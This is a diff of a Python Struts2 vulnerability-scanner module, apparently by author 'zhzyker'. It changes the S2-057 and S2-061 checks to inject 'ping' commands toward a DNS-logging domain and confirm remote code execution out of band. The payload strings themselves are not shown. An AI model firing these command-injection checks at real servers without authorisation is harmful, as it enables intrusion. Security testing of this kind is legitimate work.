@@ -1,21 +1,16 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 import http.client
-import urllib
-import urllib.request
-from lxml import etree
-from lxml import html
 import base64
-import requests
+from thirdparty import requests
 import threading
 import http.client
 from module import globals
 from core.verify import verify
 from core.verify import misinformation
 from module.md5 import random_md5
-from requests.packages import urllib3
-from requests_toolbelt.utils import dump
-urllib3.disable_warnings()
+from thirdparty.requests_toolbelt.utils import dump
+from module.api.dns import dns_result, dns_request
 
 
 class ApacheStruts2():
@@ -551,7 +546,7 @@ class ApacheStruts2():
                 self.vul_info["vul_data"] = dump.dump_all(self.request).decode('utf-8', 'ignore')
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
                 self.vul_info["vul_payd"] = self.payload_s2_045.replace("RECOMMAND", cmd)
-                self.vul_info["prt_info"] = "[rce] [cmd:" + cmd + "]"
+                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
             else:
                 self.request = requests.post(self.url, headers=headers_2, timeout=self.timeout, verify=False)
                 if r"54289" in self.request.headers['FUCK']:
@@ -726,20 +721,16 @@ class ApacheStruts2():
                                     "package have no or wildcard namespace."
         self.vul_info["cre_date"] = "2021-01-30"
         self.vul_info["cre_auth"] = "zhzyker"
-        md = random_md5()
-        cmd = "echo " + md
+        md = dns_request()
+        cmd = "ping " + md
         self.payload = self.payload_s2_057.replace("RECOMMAND", cmd)
         try:
             self.req = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
-            self.page = self.req.text
-            self.etree = html.etree
-            self.page = self.etree.HTML(self.page)
-            self.data = self.page.xpath('//footer/div[1]/p[1]/a[1]/@*')
-            if md in misinformation(self.data, md):
+            if dns_result(md):
                 self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
                 self.vul_info["vul_payd"] = self.payload
-                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
+                self.vul_info["prt_info"] = "[dns] [cmd: " + cmd + "]"
             verify.scan_print(self.vul_info)
         except requests.exceptions.Timeout:
             verify.timeout_print(self.vul_info["prt_name"])
@@ -808,22 +799,18 @@ class ApacheStruts2():
                                     " may lead to remote code execution."
         self.vul_info["cre_date"] = "2021-01-30"
         self.vul_info["cre_auth"] = "zhzyker"
-        md = random_md5()
-        cmd = "echo " + md
+        md = dns_request()
+        cmd = "ping " + md
         self.payload = self.payload_s2_061.replace("RECOMMAND", cmd)
         if r"?" not in self.url:
             self.url_061 = self.url + "?id="
         try:
-            self.req = requests.get(self.url_061 + self.payload, headers=self.headers, timeout=self.timeout,
-                                    verify=False)
-            self.page = self.req.text
-            self.page = etree.HTML(self.page)
-            self.r = self.page.xpath('//a[@id]/@id')[0]
-            if md in misinformation(self.r, md):
+            self.req = requests.get(self.url_061 + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
+            if dns_result(md):
                 self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
                 self.vul_info["vul_payd"] = self.payload
-                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
+                self.vul_info["prt_info"] = "[dns] [cmd: " + cmd + "]"
             verify.scan_print(self.vul_info)
         except requests.exceptions.Timeout:
             verify.timeout_print(self.vul_info["prt_name"])
